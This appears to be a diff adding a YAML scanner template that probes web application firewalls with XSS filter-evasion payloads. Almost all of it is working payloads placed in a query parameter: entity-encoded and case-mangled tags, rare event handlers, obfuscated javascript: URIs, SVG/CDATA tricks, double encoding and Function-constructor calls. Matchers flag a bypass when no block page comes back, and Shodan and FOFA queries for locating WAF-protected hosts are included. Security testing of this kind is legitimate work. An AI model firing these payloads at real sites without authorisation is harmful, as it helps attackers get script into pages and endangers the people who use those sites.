@@ -1,0 +1,217 @@
+id: waf-xss-evasion-bypass
+info:
+  name: WAF XSS Evasion Techniques
+  author: waftester
+  severity: high
+  description: |
+    Tests XSS bypass using advanced evasion techniques from real-world WAF
+    bypass research. Includes HTML entity encoding, case manipulation, tag
+    mutation, event handler obfuscation, protocol tricks, template literals,
+    Function constructor abuse, DOM clobbering, SVG namespace confusion,
+    and WAF-vendor-specific XSS bypass techniques.
+  reference:
+    - https://owasp.org/www-community/attacks/xss/
+    - https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+    - https://github.com/0xInfection/Awesome-WAF
+    - https://html5sec.org/
+    - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+  tags: xss,waf,bypass,evasion,tamper,waftester
+  classification:
+    cwe-id:
+      - CWE-79
+      - CWE-693
+      - CWE-116
+  metadata:
+    verified: true
+    max-request: 28
+    shodan-query: "http.waf"
+    fofa-query: "header=\"WAF\""
+
+http:
+  # HTML entity encoding - decimal and hex
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"
+      - "{{BaseURL}}/?q=<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>"
+      - "{{BaseURL}}/?q=<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&colon;alert(1)>click</a>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406 && status_code != 429"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+          - "Request Rejected"
+        negative: true
+        condition: or
+
+  # Case manipulation and tag mutation
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<ScRiPt>alert(1)</ScRiPt>"
+      - "{{BaseURL}}/?q=<scRIPT>alert(1)</SCRIPT>"
+      - "{{BaseURL}}/?q=<IMG SRC=x ONERROR=alert(1)>"
+      - "{{BaseURL}}/?q=<iMg sRc=x oNeRrOr=alert(1)>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Exotic event handlers - uncommon handlers that bypass keyword filters
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<body style=height:1000px onwheel=alert(1)>"
+      - "{{BaseURL}}/?q=<div onpointerover=alert(1)>hover</div>"
+      - "{{BaseURL}}/?q=<div onauxclick=alert(1)>click</div>"
+      - "{{BaseURL}}/?q=<div ondragstart=alert(1) draggable=true>drag</div>"
+      - "{{BaseURL}}/?q=<div onanimationend=alert(1) style=animation-name:x>"
+      - "{{BaseURL}}/?q=<div ontransitionend=alert(1) style=transition:1s>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # JavaScript alternative invocation - bracket notation, template literals
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<img src=x onerror=window['alert'](1)>"
+      - "{{BaseURL}}/?q=<img src=x onerror=self['alert'](1)>"
+      - "{{BaseURL}}/?q=<img src=x onerror=parent['alert'](1)>"
+      - "{{BaseURL}}/?q=<img src=x onerror=top['al'%2B'ert'](1)>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Protocol obfuscation - whitespace and encoding in javascript: URIs
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<a href='jav%0Dascript:alert(1)'>click</a>"
+      - "{{BaseURL}}/?q=<a href='java%09script:alert(1)'>click</a>"
+      - "{{BaseURL}}/?q=<a href='java%0ascript:alert(1)'>click</a>"
+      - "{{BaseURL}}/?q=<a href='j%00avascript:alert(1)'>click</a>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # SVG-based evasion
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<svg/onload=alert(String.fromCharCode(49))>"
+      - "{{BaseURL}}/?q=<svg><desc><![CDATA[</desc><script>alert(1)</script>]]>"
+      - "{{BaseURL}}/?q=<svg><foreignObject><body onload=alert(1)>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Double encoding
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"
+      - "{{BaseURL}}/?q=%253Csvg%2520onload%253Dalert(1)%253E"
+      - "{{BaseURL}}/?q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Function constructor and eval alternatives
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<img src=x onerror=Function('al'%2b'ert(1)')()>"
+      - "{{BaseURL}}/?q=<img src=x onerror=setTimeout('alert(1)',0)>"
+      - "{{BaseURL}}/?q=<img src=x onerror=setInterval('alert(1)',1000)>"
+      - "{{BaseURL}}/?q=<img src=x onerror=[].constructor.constructor('alert(1)')()>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
+
+  # Null byte and comment injection
+  - method: GET
+    path:
+      - "{{BaseURL}}/?q=<scri%00pt>alert(1)</scri%00pt>"
+      - "{{BaseURL}}/?q=<script>al/**/ert(1)</script>"
+      - "{{BaseURL}}/?q=<script>/*<![CDATA[*/alert(1)/*]]>*/</script>"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code != 403 && status_code != 406"
+      - type: word
+        part: body
+        words:
+          - "403"
+          - "Forbidden"
+          - "blocked"
+        negative: true
+        condition: or
